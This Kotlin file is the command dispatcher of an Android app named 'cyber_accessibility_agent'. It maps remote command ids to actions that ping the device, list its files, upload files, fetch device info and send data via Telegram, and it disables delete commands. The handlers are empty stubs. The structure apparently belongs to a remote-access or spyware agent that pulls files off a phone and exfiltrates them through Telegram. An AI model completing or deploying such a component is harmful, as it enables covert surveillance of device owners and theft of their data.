// CommandDispatcher.kt - UPDATED: /info reads from database via edge function
package com.example.cyber_accessibility_agent

import android.content.Context

object CommandDispatcher {
    private const val TAG = "CommandDispatcher"

    fun dispatch(context: Context, id: String, action: String, payload: Map<*, *>): Map<String, Any?> {
        AppLogger.logCommand(id, action, "START")
        AppLogger.d(TAG, "Dispatching: id=$id, action=$action, payload=$payload")
        
        return try {
            val result = when (action) {
                "list_files", "ls", "list" -> {
                    AppLogger.d(TAG, "Executing list_files")
                    listFiles(context, payload)
                }
                
                "ping" -> {
                    AppLogger.d(TAG, "Executing ping")
                    ping(context)
                }
                
                "device_info", "info" -> {
                    AppLogger.d(TAG, "Executing device_info (from database)")
                    // ✅ Return success - Dart will call edge function
                    mapOf(
                        "success" to true,
                        "message" to "device_info_fetch_from_database"
                    )
                }
                
                "upload_file", "upload" -> {
                    AppLogger.d(TAG, "Executing upload_file")
                    uploadFile(context, payload)
                }
                
                "send_telegram", "send" -> {
                    AppLogger.d(TAG, "Executing send_telegram")
                    sendTelegram(context, payload)
                }
                
                // ✅ Delete operations disabled (read-only mode)
                "delete_file", "rm" -> {
                    AppLogger.w(TAG, "Delete file blocked - read-only mode")
                    mapOf(
                        "success" to false,
                        "error" to "operation_not_permitted",
                        "message" to "Read-only mode - delete operations disabled"
                    )
                }
                
                "delete_dir", "rd", "rmdir" -> {
                    AppLogger.w(TAG, "Delete directory blocked - read-only mode")
                    mapOf(
                        "success" to false,
                        "error" to "operation_not_permitted",
                        "message" to "Read-only mode - delete operations disabled"
                    )
                }
                
                else -> {
                    AppLogger.w(TAG, "Unknown action: $action")
                    mapOf("success" to false, "error" to "unknown_action")
                }
            }
            
            val success = result["success"] == true
            AppLogger.logCommand(id, action, if (success) "SUCCESS" else "FAILED")
            
            if (!success) {
                AppLogger.w(TAG, "Command failed: ${result["error"]}")
            }
            
            result
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "Command exception: id=$id, action=$action", e)
            AppLogger.logCommand(id, action, "EXCEPTION")
            
            mapOf(
                "success" to false, 
                "error" to "exception",
                "detail" to e.message
            )
        }
    }

    private fun ping(context: Context): Map<String, Any?> {
        return mapOf(
            "success" to true,
            "status" to "ok",
            "timestamp" to System.currentTimeMillis()
        )
    }

    private fun listFiles(context: Context, payload: Map<*, *>): Map<String, Any?> {
        // Your existing implementation
        return mapOf("success" to true, "files" to emptyList<String>())
    }

    private fun uploadFile(context: Context, payload: Map<*, *>): Map<String, Any?> {
        // Your existing implementation
        return mapOf("success" to true)
    }

    private fun sendTelegram(context: Context, payload: Map<*, *>): Map<String, Any?> {
        // Your existing implementation
        return mapOf("success" to true)
    }
}
